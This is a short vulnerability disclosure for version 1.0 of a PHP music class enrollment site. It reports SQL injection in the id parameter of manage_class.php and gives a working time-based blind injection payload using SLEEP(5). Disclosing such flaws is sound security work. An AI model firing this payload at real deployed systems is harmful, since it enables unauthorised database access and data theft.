# SQL injection vulnerability exists in the music course registration system

## Vulnerability author:wanglun

supplier:
https://www.sourcecodester.com/php/15362/music-class-enrollment-site-phpoop-free-source-code.html

edition: 
1.0

/manage_class.php

The Id parameter has SQL injection. Procedure

Payload: http://localhost:80/mces/admin/?page=classes/manage_class&id=4' AND (SELECT 4594 FROM (SELECT(SLEEP(5)))ausq) AND 'oWIJ'='oWIJ

![image](https://github.com/user-attachments/assets/99f448cc-ba5f-4f51-bc99-2b41d5389e81)

![image](https://github.com/user-attachments/assets/a009953f-0066-4d84-9e94-312c29169713)
